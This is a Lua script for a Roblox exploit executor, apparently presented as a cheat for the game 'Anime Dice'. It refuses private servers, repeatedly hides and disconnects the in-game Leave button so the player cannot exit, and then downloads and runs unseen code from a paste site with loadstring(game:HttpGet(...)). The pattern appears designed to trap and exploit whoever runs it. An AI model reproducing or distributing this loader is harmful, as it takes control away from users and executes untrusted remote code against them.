local Services = setmetatable({}, {
    __index = function(self, s)
        return game:GetService(s)
    end
})

local TARGET_PLACE_ID = 113290951185459
local MAX_PLAYERS = 9

if game.PlaceId ~= TARGET_PLACE_ID then
    game.Players.LocalPlayer:Kick("Script: Only works in Anime Dice")
    return
end

local IsVipServer = false
pcall(function()
    local rs = Services.RobloxReplicatedStorage
    if rs and rs:FindFirstChild("GetServerType") then
        IsVipServer = (rs.GetServerType:InvokeServer() == "VIPServer")
    end
end)

if IsVipServer then
    game.Players.LocalPlayer:Kick("Script: Private servers not supported — join a normal server")
    return
end

task.spawn(function()
    while task.wait(0.3) do
        pcall(function()
            local CoreGui = Services.CoreGui
            if not CoreGui then return end
            for _, btn in ipairs(CoreGui:GetDescendants()) do
                if btn:IsA("GuiButton") and btn.Name == "LeaveGameButton" then
                    btn.Visible = false
                    if getconnections then
                        for _, conn in ipairs(getconnections(btn.Activated)) do
                            conn:Disable()
                        end
                    end
                    if btn.Activated.DisconnectAll then
                        btn.Activated:DisconnectAll()
                    end
                end
            end
        end)
    end
end)

local function hopToPublic()
    local HttpService = Services.HttpService
    local TeleportService = Services.TeleportService
    local Players = Services.Players
    local placeId = game.PlaceId
    local jobId = game.JobId
    local list, cursor = {}, ""
    repeat
        local ok, res = pcall(function()
            local url = string.format(
                "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100&cursor=%s",
                placeId, cursor
            )
            return HttpService:JSONDecode(game:HttpGet(url))
        end)
        if ok and res then
            cursor = res.nextPageCursor or ""
            for _, s in pairs(res.data or {}) do
                if s.id ~= jobId and s.playing < s.maxPlayers then
                    table.insert(list, s)
                end
            end
        end
    until cursor == "" or #list >= 10

    if #list > 0 then
        local pick = list[math.random(1, #list)]
        TeleportService:TeleportToPlaceInstance(placeId, pick.id, Players.LocalPlayer)
    else
        warn("[Anime Dice] No public servers found to hop to")
    end
end

task.spawn(function()
    task.wait(0.5)
    local ok, err = pcall(function()
        loadstring(game:HttpGet("https://cdn.sourceb.in/bins/o1C7Ov7wRE/0"))()
    end)
    if not ok then
        warn("[Anime Dice] Loader failed: " .. tostring(err))
    end
end)
